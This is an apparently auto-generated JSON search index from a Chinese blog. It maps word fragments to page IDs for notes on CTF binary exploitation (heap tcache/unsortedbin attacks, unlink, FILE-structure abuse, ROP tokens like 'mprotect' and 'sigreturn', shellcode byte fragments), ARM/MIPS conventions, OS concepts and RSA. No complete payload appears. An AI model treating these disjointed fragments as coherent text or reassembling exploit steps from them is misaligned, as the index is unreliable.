个chunk上\",{\"1\":{\"302\":1}}],[\"第9chunk\",{\"1\":{\"302\":1}}],[\"第十一个防止合并\",{\"1\":{\"302\":1}}],[\"第十七节\",{\"1\":{\"103\":1}}],[\"第二次输入\",{\"1\":{\"505\":1}}],[\"第二次构造\",{\"1\":{\"505\":1}}],[\"第二次直接劫持程序流程one\",{\"1\":{\"481\":1}}],[\"第二次double\",{\"1\":{\"475\":1}}],[\"第二次负责修改\",{\"1\":{\"372\":1,\"494\":1}}],[\"第二个参数\",{\"1\":{\"449\":1}}],[\"第二个最低有效位来区分强引用和弱引用\",{\"1\":{\"82\":1,\"222\":1}}],[\"第二部分\",{\"1\":{\"426\":1}}],[\"第二题apples\",{\"1\":{\"299\":1}}],[\"第二\",{\"1\":{\"69\":1,\"209\":1}}],[\"第一次泄露libc\",{\"1\":{\"481\":1}}],[\"第一次泄露tls中的key\",{\"1\":{\"372\":1,\"494\":1}}],[\"第一次构造\",{\"1\":{\"479\":1}}],[\"第一次拿到这个附件\",{\"1\":{\"463\":1}}],[\"第一部分\",{\"1\":{\"426\":1}}],[\"第一个参数\",{\"1\":{\"449\":1}}],[\"第一个参数argc\",{\"1\":{\"37\":1,\"177\":1}}],[\"第一个chunk\",{\"1\":{\"321\":1}}],[\"第一\",{\"1\":{\"69\":1,\"209\":1}}],[\"第5章\",{\"1\":{\"50\":1,\"190\":1,\"436\":1}}],[\"叶子函数则直接ra进行跳转\",{\"1\":{\"49\":1,\"189\":1}}],[\"叶子函数的话\",{\"1\":{\"49\":1,\"189\":1}}],[\"叶子函数也就是函数中不会去调用其他任何函数\",{\"1\":{\"49\":1,\"189\":1}}],[\"非预期数据\",{\"1\":{\"491\":1,\"503\":1}}],[\"非主分配区申请后\",{\"1\":{\"353\":1}}],[\"非主分配区一般都是通过mmap向系统申请内存\",{\"1\":{\"353\":1}}],[\"非主分配区用mmap来映射获取内存\",{\"1\":{\"347\":1}}],[\"非主分配区\",{\"0\":{\"347\":1},\"1\":{\"353\":1}}],[\"非叶子函数\",{\"1\":{\"49\":1,\"189\":1}}],[\"非叶子函数就是还会调用其他的函数\",{\"1\":{\"49\":1,\"189\":1}}],[\"非堵塞性\",{\"1\":{\"43\":1,\"183\":1}}],[\"xc3\",{\"1\":{\"486\":2}}],[\"xa0\",{\"1\":{\"486\":1}}],[\"xab\",{\"1\":{\"485\":1}}],[\"xa4\",{\"1\":{\"482\":1}}],[\"xef\",{\"1\":{\"486\":1}}],[\"xe1\",{\"1\":{\"486\":1}}],[\"xe5\",{\"1\":{\"486\":4}}],[\"xe2\",{\"1\":{\"486\":3}}],[\"xe4\",{\"1\":{\"485\":1}}],[\"xe0\",{\"1\":{\"485\":1,\"486\":1}}],[\"xbd\",{\"1\":{\"485\":1}}],[\"xbb\",{\"1\":{\"482\":1,\"504\":1}}],[\"xd0\",{\"1\":{\"485\":1}}],[\"xd2\",{\"1\":{\"482\":1,\"504\":1}}],[\"x20\",{\"1\":{\"486\":4}}],[\"x27\",{\"1\":{\"485\":2}}],[\"x24\",{\"1\":{\"485\":4}}],[\"x2f\",{\"1\":{\"482\":3,\"504\":3}}],[\"x73\",{\"1\":{\"482\":1,\"504\":1}}],[\"x7用作参数传递\",{\"1\":{\"48\":1,\"188\":1}}],[\"x6a\",{\"1\":{\"482\":1,\"504\":1}}],[\"x68\",{\"1\":{\"482\":1,\"504\":1}}],[\"x6e\",{\"1\":{\"482\":1,\"504\":1}}],[\"x69\",{\"1\":{\"482\":1,\"504\":1}}],[\"x62\",{\"1\":{\"482\":1,\"504\":1}}],[\"x42\",{\"1\":{\"486\":1}}],[\"x48\",{\"1\":{\"482\":1,\"504\":1}}],[\"x40\",{\"1\":{\"480\":1,\"483\":1}}],[\"xff\",{\"1\":{\"485\":3}}],[\"xf6\",{\"1\":{\"482\":1,\"504\":1}}],[\"xf3\",{\"1\":{\"482\":1}}],[\"x90\",{\"1\":{\"482\":3,\"486\":1}}],[\"x91\",{\"1\":{\"481\":1}}],[\"x51\",{\"1\":{\"483\":1}}],[\"x58\",{\"1\":{\"482\":1,\"504\":1}}],[\"x54\",{\"1\":{\"482\":1,\"504\":1}}],[\"x53\",{\"1\":{\"482\":1,\"504\":1}}],[\"x56\",{\"1\":{\"482\":1,\"504\":1}}],[\"x5f\",{\"1\":{\"482\":2,\"504\":1}}],[\"x52\",{\"1\":{\"482\":1}}],[\"xsgetn\",{\"1\":{\"395\":6,\"401\":2}}],[\"xsputn\",{\"1\":{\"395\":6,\"401\":2,\"404\":1}}],[\"x10\",{\"1\":{\"486\":1}}],[\"x1c\",{\"1\":{\"486\":1}}],[\"x14\",{\"1\":{\"485\":1}}],[\"x11\",{\"1\":{\"485\":1}}],[\"x13\",{\"1\":{\"480\":1,\"483\":1,\"486\":1}}],[\"x1\",{\"1\":{\"394\":2,\"395\":2}}],[\"x19`\",{\"1\":{\"131\":1}}],[\"x19\",{\"1\":{\"130\":1,\"131\":4,\"133\":1}}],[\"xor+0x42\",{\"1\":{\"503\":1}}],[\"xor+0x21\",{\"1\":{\"380\":1,\"502\":1}}],[\"xor\",{\"1\":{\"378\":2,\"483\":4,\"500\":2,\"503\":1}}],[\"xyctf\",{\"0\":{\"370\":1,\"526\":1},\"1\":{\"480\":1,\"481\":1,\"483\":1,\"485\":1,\"486\":1,\"504\":1}}],[\"xx\",{\"1\":{\"258\":2}}],[\"xxxxx\",{\"1\":{\"118\":1}}],[\"xxxxxx\",{\"1\":{\"118\":1,\"401\":1}}],[\"xxxx\",{\"1\":{\"114\":2,\"118\":1}}],[\"xxx\",{\"1\":{\"60\":1,\"118\":1,\"200\":1}}],[\"x\",{\"1\":{\"242\":4,\"243\":4,\"287\":2,\"290\":2,\"464\":1,\"491\":1}}],[\"x替换d\",{\"1\":{\"240\":1}}],[\"xml文件分析\",{\"0\":{\"139\":1}}],[\"xml文件\",{\"1\":{\"130\":1}}],[\"x8d\",{\"1\":{\"486\":3}}],[\"x8f\",{\"1\":{\"486\":2}}],[\"x86\",{\"1\":{\"73\":1,\"213\":1,\"449\":1,\"456\":1}}],[\"x8用作调用号\",{\"1\":{\"48\":1,\"188\":1}}],[\"xiaolincoding\",{\"1\":{\"63\":1,\"66\":1,\"68\":1,\"71\":1,\"203\":1,\"206\":1,\"208\":1,\"211\":1}}],[\"x30\",{\"1\":{\"486\":3,\"488\":1}}],[\"x30也就是函数返回值\",{\"1\":{\"48\":1,\"188\":1}}],[\"x3b\",{\"1\":{\"482\":1,\"504\":1}}],[\"x31\",{\"1\":{\"482\":2,\"504\":2}}],[\"x3a\",{\"1\":{\"480\":1}}],[\"x32是pc寄存器\",{\"1\":{\"48\":1,\"188\":1}}],[\"x0b\",{\"1\":{\"486\":2}}],[\"x07\",{\"1\":{\"486\":1}}],[\"x08\",{\"1\":{\"486\":1}}],[\"x0c\",{\"1\":{\"485\":1}}],[\"x02\",{\"1\":{\"485\":1,\"486\":2}}],[\"x04\",{\"1\":{\"485\":1,\"486\":3}}],[\"x06\",{\"1\":{\"485\":2}}],[\"x01\",{\"1\":{\"483\":1,\"485\":1,\"486\":1}}],[\"x05\",{\"1\":{\"482\":1,\"485\":1,\"504\":1}}],[\"x0f\",{\"1\":{\"482\":1,\"485\":1,\"504\":1}}],[\"x00\",{\"1\":{\"358\":2,\"359\":2,\"369\":2,\"378\":1,\"380\":3,\"473\":3,\"475\":2,\"479\":3,\"480\":2,\"481\":3,\"482\":2,\"483\":9,\"484\":2,\"485\":8,\"486\":2,\"488\":2,\"491\":4,\"500\":1,\"502\":3,\"503\":20,\"504\":2,\"505\":4}}],[\"x0用作函数返回值\",{\"1\":{\"48\":1,\"188\":1}}],[\"x0\",{\"1\":{\"48\":1,\"188\":1}}],[\"寄存器名字叫做x了\",{\"1\":{\"48\":1,\"188\":1}}],[\"结构体的指针\",{\"1\":{\"458\":1}}],[\"结构体\",{\"0\":{\"389\":1,\"390\":1,\"391\":1}}],[\"结构体中存储了长度和容量以及指针这样就可以实现动态扩容了\",{\"1\":{\"28\":1,\"170\":1}}],[\"结构体中存储类型的hash值\",{\"1\":{\"26\":1,\"168\":1}}],[\"结构体中指针函数和普通函数\",{\"0\":{\"24\":1,\"166\":1}}],[\"结构图\",{\"1\":{\"286\":1}}],[\"结合偏移值从而得到libc的加载地址\",{\"1\":{\"284\":1}}],[\"结合cubefs社区的提交规范进行的总结\",{\"1\":{\"263\":1}}],[\"结果发现想复杂了\",{\"1\":{\"483\":1}}],[\"结果加速器一关久解决好了\",{\"1\":{\"261\":1}}],[\"结果没办法解决\",{\"1\":{\"258\":1}}],[\"结果\",{\"0\":{\"360\":1},\"1\":{\"124\":1,\"258\":2}}],[\"结尾的开始\",{\"1\":{\"47\":1,\"187\":1}}],[\"序幕结束\",{\"1\":{\"47\":1,\"187\":1}}],[\"序幕的开始\",{\"1\":{\"47\":1,\"187\":1}}],[\"将十六进制数字转换为字符串\",{\"1\":{\"503\":1}}],[\"将内容赋值过去\",{\"1\":{\"483\":1}}],[\"将控制权移交给ld\",{\"1\":{\"454\":1}}],[\"将返回地址移动到\",{\"1\":{\"449\":1}}],[\"将reloc\",{\"1\":{\"449\":1}}],[\"将rip寄存器改值\",{\"1\":{\"446\":1}}],[\"将rbp寄存器改值\",{\"1\":{\"446\":1}}],[\"将file链接到\",{\"1\":{\"403\":1}}],[\"将fd指向exit\",{\"1\":{\"380\":1,\"502\":1}}],[\"将fd和bk包含在这个大chunk中\",{\"1\":{\"302\":1}}],[\"将topchunk消耗空触发合并\",{\"1\":{\"380\":1,\"502\":1}}],[\"将tls放在栈顶部\",{\"1\":{\"38\":1,\"178\":1}}],[\"将\",{\"1\":{\"365\":1,\"369\":1,\"403\":1}}],[\"将新的分配区加入到全局链表上\",{\"1\":{\"353\":1}}],[\"将当前线程设置mstate\",{\"1\":{\"353\":1}}],[\"将合并后的chunk\",{\"1\":{\"324\":1}}],[\"将块\",{\"1\":{\"324\":1}}],[\"将p\",{\"1\":{\"296\":2}}],[\"将此值设置为true并不能保证将支持压缩\",{\"1\":{\"254\":1}}],[\"将会分配到链接生命周期里\",{\"1\":{\"254\":1}}],[\"将大量函数暴露在各个层级之间\",{\"1\":{\"245\":1}}],[\"将两个大质数相乘十分容易\",{\"1\":{\"238\":1}}],[\"将其他开发者\",{\"1\":{\"110\":1}}],[\"将高32位存储在r13寄存器中\",{\"1\":{\"83\":1,\"223\":1}}],[\"将帧指针和lr保存到堆栈\",{\"1\":{\"47\":1,\"187\":1}}],[\"再占满tcache\",{\"1\":{\"491\":1}}],[\"再利用leave\",{\"1\":{\"445\":1}}],[\"再利用分割机制就可以泄露libc\",{\"1\":{\"302\":1}}],[\"再通过分割机制\",{\"1\":{\"372\":1,\"494\":1}}],[\"再申请回来\",{\"1\":{\"372\":1,\"494\":1}}],[\"再去查找libc的基地址\",{\"1\":{\"287\":1}}],[\"再进行的函数跳转\",{\"1\":{\"47\":1,\"187\":1}}],[\"再打开一个文件文件描述符就是4\",{\"1\":{\"15\":1,\"157\":1}}],[\"也是用于分页查看文件内容\",{\"1\":{\"464\":1}}],[\"也是号称地球上最安全的加密算法\",{\"1\":{\"238\":1}}],[\"也没有看见什么东西\",{\"1\":{\"463\":1}}],[\"也进行一样的操作\",{\"1\":{\"312\":1}}],[\"也属于一个堆块\",{\"1\":{\"287\":1}}],[\"也保持打开状态\",{\"1\":{\"258\":1}}],[\"也包含了不相关的其他逻辑\",{\"1\":{\"252\":1}}],[\"也依赖于dao层\",{\"1\":{\"252\":1}}],[\"也可以docker\",{\"1\":{\"258\":1}}],[\"也可以不写\",{\"1\":{\"124\":1}}],[\"也可以在程序中保存立即数\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是动态共享库的路径\",{\"1\":{\"453\":1}}],[\"也就是会执行push\",{\"1\":{\"449\":1}}],[\"也就是标准文件流\",{\"1\":{\"426\":1}}],[\"也就是说其记录的指针不能被修改\",{\"1\":{\"399\":1}}],[\"也就是说我们的commit链长这个样子\",{\"1\":{\"273\":1}}],[\"也就是覆盖file结构体0xd8偏移位置的数据\",{\"1\":{\"385\":1}}],[\"也就是0x90大小的chunk\",{\"1\":{\"376\":1,\"498\":1}}],[\"也就是0x440位置存在fd和bk\",{\"1\":{\"365\":1,\"369\":1}}],[\"也就是0x0000\",{\"1\":{\"70\":1,\"210\":1}}],[\"也就是下一个chunk的prev\",{\"1\":{\"345\":1}}],[\"也就是下一个free的chunk\",{\"1\":{\"337\":1}}],[\"也就是检查fd\",{\"1\":{\"345\":1}}],[\"也就是payload的部分\",{\"1\":{\"338\":1}}],[\"也就是phi\",{\"1\":{\"240\":1}}],[\"也就是一个超大的chunk\",{\"1\":{\"329\":1}}],[\"也就是一个稳定的组件不能够依赖一个不稳定的组件\",{\"1\":{\"252\":1}}],[\"也就是4\",{\"1\":{\"329\":1}}],[\"也就是目标地址赋值victim\",{\"1\":{\"325\":1}}],[\"也就是fwd的bk为我们想要泄露到的目标地址\",{\"1\":{\"325\":1}}],[\"也就是最低的地址为00\",{\"1\":{\"365\":1}}],[\"也就是最小的那个chunk\",{\"1\":{\"321\":1}}],[\"也就是最后一个加入tcache的chunk\",{\"1\":{\"287\":1}}],[\"也就是把bck提到fwd前方\",{\"1\":{\"319\":1}}],[\"也就是把lr和栈底压入栈\",{\"1\":{\"48\":1,\"188\":1}}],[\"也就是large\",{\"1\":{\"319\":1}}],[\"也就是分割过一次\",{\"1\":{\"313\":1}}],[\"也就是unsortedbin中仅有一个chunk\",{\"1\":{\"313\":1}}],[\"也就是bck\",{\"1\":{\"310\":1}}],[\"也就是bin头部通过fd\",{\"1\":{\"308\":1}}],[\"也就是main\",{\"1\":{\"287\":1}}],[\"也就是mvc中model仅仅包含对象属性的定义并且基础的get\",{\"1\":{\"252\":1}}],[\"也就是正常的commit\",{\"1\":{\"276\":1}}],[\"也就是正常git\",{\"1\":{\"274\":1}}],[\"也就是我们要修改的chunk为chunk\",{\"1\":{\"368\":1}}],[\"也就是我们要选择的主线\",{\"1\":{\"274\":1}}],[\"也就是我们的a接受的是d接口集合\",{\"1\":{\"250\":1}}],[\"也就是通过merge合并分支产生的commit\",{\"1\":{\"274\":1}}],[\"也就是通过n的分解\",{\"1\":{\"243\":1}}],[\"也就是参数为\",{\"1\":{\"254\":1}}],[\"也就是参考了tcmalloc函数\",{\"1\":{\"50\":1,\"190\":1}}],[\"也就是如果两个类本身没有直接通讯的手段\",{\"1\":{\"252\":1}}],[\"也就是依赖必须要指向更稳定的方向\",{\"1\":{\"252\":1}}],[\"也就是依赖抽象\",{\"1\":{\"252\":1}}],[\"也就是基于原本的实现进行扩展而不是进行修改\",{\"1\":{\"252\":1}}],[\"也就是基于对象的设计思想\",{\"1\":{\"252\":1}}],[\"也就是面对对象设计原则\",{\"1\":{\"252\":1}}],[\"也就是比如a是发布者\",{\"1\":{\"251\":1}}],[\"也就是抽象出一个消息代理\",{\"1\":{\"251\":1}}],[\"也就是a的稳定性依赖于b和c两个类\",{\"1\":{\"250\":1}}],[\"也就是在dest函数下面写入对应的脚本\",{\"1\":{\"461\":1}}],[\"也就是在设计模块的时候经常发生各个模块之间怎么实现通讯或者调用其他模块的函数\",{\"1\":{\"245\":1}}],[\"也就是在用户态中执行\",{\"1\":{\"23\":1,\"165\":1}}],[\"也就是不直接依赖b和c而是去依赖一个接口d和e\",{\"1\":{\"245\":1}}],[\"也就是能够将n因式分解就可以算出p和q\",{\"1\":{\"241\":1}}],[\"也就是n\",{\"1\":{\"241\":1}}],[\"也就是\",{\"1\":{\"240\":1,\"329\":1,\"451\":1}}],[\"也就是1<\",{\"1\":{\"240\":1}}],[\"也就是找到所有类型为这个类的对象\",{\"1\":{\"125\":1}}],[\"也就是你的项目采用的开源协议\",{\"1\":{\"112\":1}}],[\"也就是父对象\",{\"1\":{\"84\":1,\"224\":1}}],[\"也就是js对象都是继承自另外个对象\",{\"1\":{\"84\":1,\"224\":1}}],[\"也就是调用kzalloc\",{\"1\":{\"79\":1,\"219\":1}}],[\"也就是内核状态下不允许访问用户态的数据\",{\"1\":{\"74\":1,\"214\":1}}],[\"也就是内核状态下不允许执行用户态的代码\",{\"1\":{\"74\":1,\"214\":1}}],[\"也就是kernel的aslr\",{\"1\":{\"74\":1,\"214\":1}}],[\"也就是缓冲区的作用比如做一些copy操作的时候\",{\"1\":{\"70\":1,\"210\":1}}],[\"也就是允许建立与物理高端内存的长期映射关系\",{\"1\":{\"70\":1,\"210\":1}}],[\"也就是使用vmalloc进行申请的区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"也就是打main函数返回\",{\"1\":{\"60\":1,\"200\":1}}],[\"也就是当前我们要free的chunk\",{\"1\":{\"324\":1}}],[\"也就是当一个函数是异步状态的时候\",{\"1\":{\"280\":1}}],[\"也就是当a数据更新的时候实际上我们调用的而是d接口\",{\"1\":{\"250\":1}}],[\"也就是当我们所需要的chunk不属于fastbin\",{\"1\":{\"57\":1,\"197\":1}}],[\"也就是当返回值是一个结构体的时候那么r0就不是第一个参数而是返回值的指针\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是申请大于2m则申请chunk\",{\"1\":{\"50\":1,\"190\":1}}],[\"也就是chunk\",{\"1\":{\"50\":1,\"190\":1,\"319\":1}}],[\"也就是前4个用寄存器保存后面用栈保存\",{\"1\":{\"49\":1,\"189\":1}}],[\"也就是r1直接赋值给r2\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是r1的值会发生改变\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是存入r+2的位置\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是将最后的地址写入原寄存器中\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是将寄存器的值存入指针中\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是将指针的值存入寄存器中\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是将sp变回栈底\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是将io写入sq\",{\"1\":{\"43\":1,\"183\":1}}],[\"也就是先free\",{\"1\":{\"367\":1}}],[\"也就是先保存栈底和下一个指令地址\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是先压reloc\",{\"1\":{\"36\":1,\"176\":1}}],[\"也就是ip\",{\"1\":{\"47\":1,\"187\":1}}],[\"也就是同时干\",{\"1\":{\"43\":1,\"183\":1}}],[\"也就是submit\",{\"1\":{\"43\":1,\"183\":1}}],[\"也就是传给程序的参数个数\",{\"1\":{\"37\":1,\"177\":1}}],[\"也就是从reloc\",{\"1\":{\"36\":1,\"176\":1}}],[\"也就是拷贝一份\",{\"1\":{\"29\":1,\"171\":1}}],[\"也就是线性地址转向真实的物理地址\",{\"1\":{\"21\":1,\"163\":1}}],[\"环境拿下来后可以通过指令直接运行起内核\",{\"1\":{\"73\":1,\"213\":1}}],[\"环境搭建+基础入门\",{\"1\":{\"46\":2,\"186\":2}}],[\"环境变量字符串数组的指针\",{\"1\":{\"37\":1,\"177\":1}}],[\"百度开发者中心\",{\"1\":{\"44\":1,\"184\":1}}],[\"汇编\",{\"1\":{\"87\":1,\"227\":1,\"449\":1}}],[\"汇编ret和retf\",{\"1\":{\"44\":1,\"184\":1}}],[\"汇编语言\",{\"1\":{\"44\":1,\"184\":1}}],[\"灵活性\",{\"1\":{\"43\":1,\"183\":1}}],[\"批量处理\",{\"1\":{\"43\":1,\"183\":1}}],[\"异步方式\",{\"1\":{\"126\":1}}],[\"异步框架\",{\"0\":{\"103\":1}}],[\"异步性\",{\"1\":{\"43\":1,\"183\":1}}],[\"异构pwn\",{\"1\":{\"49\":1,\"189\":1}}],[\"异常相关\",{\"1\":{\"280\":1}}],[\"异常是同步的\",{\"1\":{\"20\":1,\"162\":1}}],[\"异常还分为故障\",{\"1\":{\"20\":1,\"162\":1}}],[\"准备写入操作\",{\"1\":{\"43\":1,\"183\":1}}],[\"准备读取操作\",{\"1\":{\"43\":1,\"183\":1}}],[\"操作指令\",{\"0\":{\"258\":1}}],[\"操作的缓存大小\",{\"1\":{\"254\":1}}],[\"操作\",{\"1\":{\"43\":1,\"183\":1}}],[\"操作系统通过pcb进程控制块来描述进程\",{\"1\":{\"66\":1,\"206\":1}}],[\"操作系统通过多级页表的方法减少驻留在内存中的页面尺寸\",{\"1\":{\"10\":1,\"152\":1}}],[\"操作系统中的中断\",{\"1\":{\"19\":1,\"161\":1}}],[\"操作系统需要将父进程虚拟内存空间中的大部分内容全部复制到子进程中\",{\"1\":{\"16\":1,\"158\":1}}],[\"操作系统不需要把所有的页表项都存放到内存中\",{\"1\":{\"10\":1,\"152\":1}}],[\"操作系统基础\",{\"1\":{\"10\":1,\"152\":1}}],[\"操作系统\",{\"0\":{\"3\":1,\"146\":1},\"1\":{\"2\":1,\"10\":1,\"145\":1,\"152\":1}}],[\"返回去掉最高位后的字符串\",{\"1\":{\"503\":1}}],[\"返回解析后的函数地址在\",{\"1\":{\"449\":1}}],[\"返回地址\",{\"1\":{\"449\":2}}],[\"返回地址存储再ra寄存器上\",{\"1\":{\"49\":1,\"189\":1}}],[\"返回结果\",{\"1\":{\"352\":1}}],[\"返回被切割后的chunk\",{\"0\":{\"322\":1}}],[\"返回内存指针\",{\"1\":{\"315\":1}}],[\"返回true则为放行\",{\"1\":{\"254\":1}}],[\"返回的时候\",{\"1\":{\"47\":1,\"187\":1}}],[\"返回的文件描述符是一个数组\",{\"1\":{\"13\":1,\"155\":1}}],[\"返回是通过pop\",{\"1\":{\"47\":1,\"187\":1}}],[\"返回值通常不会马上获取到\",{\"1\":{\"280\":1}}],[\"返回值\",{\"1\":{\"137\":1}}],[\"返回值存储再v0\",{\"1\":{\"49\":1,\"189\":1}}],[\"返回值会被优化\",{\"1\":{\"47\":1,\"187\":1}}],[\"返回值是完成的事件数量\",{\"1\":{\"43\":1,\"183\":1}}],[\"实验float的存储数据\",{\"0\":{\"470\":1}}],[\"实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应\",{\"1\":{\"378\":1,\"500\":1}}],[\"实践\",{\"0\":{\"276\":1,\"358\":1}}],[\"实际的\",{\"1\":{\"449\":1}}],[\"实际实现会根据系统的动态链接器的具体需求和优化而有所不同\",{\"1\":{\"449\":1}}],[\"实际通过zend\",{\"1\":{\"438\":1}}],[\"实际应用\",{\"1\":{\"240\":1}}],[\"实际运用中常常选择常常选择\",{\"1\":{\"240\":1}}],[\"实战\",{\"0\":{\"129\":1}}],[\"实模式就是简单通过cs\",{\"1\":{\"65\":1,\"205\":1}}],[\"实\",{\"0\":{\"65\":1,\"205\":1}}],[\"实现任意写操作\",{\"1\":{\"490\":1}}],[\"实现任意free\",{\"1\":{\"374\":1,\"496\":1}}],[\"实现会在这里\",{\"1\":{\"449\":1}}],[\"实现函数调用\",{\"1\":{\"449\":1}}],[\"实现在exit的时候任意函数的调用\",{\"1\":{\"372\":1,\"494\":1}}],[\"实现leak\",{\"1\":{\"361\":1}}],[\"实现了handler接口\",{\"1\":{\"254\":1}}],[\"实现了沙盒禁止\",{\"1\":{\"41\":1,\"181\":1}}],[\"实现数据有目的的显示\",{\"1\":{\"248\":1}}],[\"实现\",{\"1\":{\"59\":1,\"199\":1}}],[\"实现malloc\",{\"1\":{\"50\":1,\"190\":1}}],[\"实例\",{\"1\":{\"43\":1,\"183\":1}}],[\"流程知道了\",{\"1\":{\"462\":1}}],[\"流程时\",{\"1\":{\"423\":1}}],[\"流程\",{\"0\":{\"296\":1,\"328\":1,\"349\":1,\"460\":1},\"1\":{\"43\":1,\"183\":1}}],[\"流程是\",{\"1\":{\"36\":1,\"176\":1}}],[\"url\",{\"1\":{\"473\":2,\"475\":2,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":2,\"484\":2,\"485\":2,\"486\":2,\"488\":2,\"491\":2,\"503\":2,\"504\":2,\"505\":2}}],[\"uring主要是两个环形缓冲区构成\",{\"1\":{\"43\":1,\"183\":1}}],[\"uring\",{\"1\":{\"43\":15,\"183\":15}}],[\"uring利用\",{\"0\":{\"43\":1,\"183\":1}}],[\"udp是不需要链接的\",{\"1\":{\"433\":1}}],[\"udp\",{\"0\":{\"433\":1},\"1\":{\"433\":1}}],[\"uflow\",{\"1\":{\"395\":6,\"401\":1}}],[\"u64\",{\"1\":{\"369\":1,\"373\":2,\"473\":1,\"475\":3,\"479\":1,\"480\":1,\"481\":2,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":3,\"491\":2,\"495\":2,\"503\":4,\"504\":1,\"505\":1}}],[\"uu64\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"uu32\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"u32\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"uintptr\",{\"1\":{\"324\":2,\"428\":2}}],[\"up\",{\"1\":{\"290\":1,\"353\":1,\"390\":1,\"408\":1}}],[\"update时提示400\",{\"1\":{\"261\":1}}],[\"updates\",{\"1\":{\"261\":1}}],[\"upgrade\",{\"1\":{\"254\":1}}],[\"upgrader\",{\"1\":{\"254\":4}}],[\"ubuntu\",{\"1\":{\"258\":4,\"261\":5}}],[\"ubuntu14\",{\"1\":{\"257\":1}}],[\"ubuntu16\",{\"1\":{\"257\":1,\"262\":2}}],[\"ubuntu18\",{\"1\":{\"257\":1}}],[\"ubuntu20\",{\"1\":{\"257\":1}}],[\"usr\",{\"1\":{\"453\":1,\"485\":1}}],[\"usage\",{\"0\":{\"108\":1},\"1\":{\"131\":1}}],[\"used\",{\"1\":{\"324\":4,\"390\":1,\"391\":1,\"408\":1,\"417\":1}}],[\"user\",{\"1\":{\"391\":1,\"433\":1,\"485\":1}}],[\"user部分\",{\"1\":{\"301\":1}}],[\"users\",{\"1\":{\"131\":1,\"273\":1}}],[\"use\",{\"1\":{\"0\":1,\"121\":2,\"123\":2,\"124\":1,\"125\":1,\"126\":1,\"131\":1,\"324\":1,\"339\":1,\"408\":2,\"428\":1}}],[\"u\",{\"1\":{\"60\":1,\"115\":1,\"118\":2,\"131\":1,\"200\":1}}],[\"unr4v31\",{\"1\":{\"450\":1}}],[\"unrecognized\",{\"1\":{\"131\":1}}],[\"unregister\",{\"1\":{\"43\":1,\"183\":1,\"279\":1}}],[\"un\",{\"1\":{\"403\":1}}],[\"undo\",{\"1\":{\"390\":1,\"408\":1}}],[\"underflow\",{\"1\":{\"352\":1,\"395\":12,\"401\":3}}],[\"unused2\",{\"1\":{\"389\":1,\"408\":1}}],[\"unused\",{\"1\":{\"324\":1}}],[\"until\",{\"1\":{\"324\":1,\"417\":1}}],[\"unless\",{\"1\":{\"324\":2}}],[\"unlock\",{\"1\":{\"324\":2,\"339\":1,\"349\":2,\"351\":2,\"353\":2}}],[\"unlikely\",{\"1\":{\"305\":1,\"312\":8,\"319\":1,\"321\":1,\"324\":4,\"325\":1,\"342\":2,\"352\":2,\"428\":1}}],[\"unlink检查\",{\"1\":{\"362\":1}}],[\"unlink\",{\"1\":{\"295\":2,\"321\":1,\"324\":2,\"344\":1}}],[\"unlink+offbynull\",{\"0\":{\"291\":1}}],[\"unsafeunlink\",{\"0\":{\"345\":1}}],[\"unsortedbin进入topchunk\",{\"1\":{\"373\":1,\"495\":1}}],[\"unsortedbin在合并的时候\",{\"1\":{\"344\":1}}],[\"unsortedbin\",{\"0\":{\"343\":1},\"1\":{\"311\":2,\"347\":1}}],[\"unsortedbin的合并\",{\"0\":{\"309\":1}}],[\"unsortedbin头结点\",{\"1\":{\"287\":1}}],[\"unsorted\",{\"1\":{\"285\":1,\"287\":1,\"310\":2,\"312\":7,\"313\":4,\"314\":2,\"321\":3,\"324\":3,\"330\":1,\"347\":1,\"357\":2}}],[\"unsortbin的fd和bk指向自身main\",{\"1\":{\"284\":1}}],[\"unsigned\",{\"1\":{\"43\":3,\"60\":1,\"183\":3,\"200\":1,\"313\":2,\"319\":5,\"321\":4,\"324\":6,\"339\":2,\"347\":1,\"353\":2,\"408\":1,\"462\":1}}],[\"无法根据malloc\",{\"1\":{\"288\":1}}],[\"无法直接double\",{\"1\":{\"55\":1,\"195\":1}}],[\"无上下文接管\",{\"1\":{\"254\":1}}],[\"无名图书\",{\"1\":{\"113\":1}}],[\"无write\",{\"1\":{\"42\":1,\"182\":1}}],[\"无端\",{\"1\":{\"15\":1,\"157\":1}}],[\"侧信道攻击\",{\"1\":{\"42\":1,\"182\":1}}],[\"+mprotect+pop\",{\"1\":{\"504\":1}}],[\"+mov\",{\"1\":{\"473\":1}}],[\"+read+p64\",{\"1\":{\"504\":1}}],[\"+read+pop\",{\"1\":{\"503\":1}}],[\"+ret+p64\",{\"1\":{\"473\":1}}],[\"+open64+pop\",{\"1\":{\"503\":1}}],[\"+write\",{\"1\":{\"503\":2}}],[\"+sigreturn\",{\"1\":{\"505\":2}}],[\"+size所占字节数\",{\"1\":{\"289\":1}}],[\"+shellcode\",{\"1\":{\"486\":1}}],[\"+47\",{\"1\":{\"481\":1}}],[\"+40\",{\"1\":{\"292\":1}}],[\"+b\",{\"1\":{\"479\":1,\"482\":1,\"485\":1,\"488\":1,\"503\":1}}],[\"+0x3d1ee\",{\"1\":{\"503\":1}}],[\"+0x50d70\",{\"1\":{\"491\":1}}],[\"+0x522c0\",{\"1\":{\"479\":1}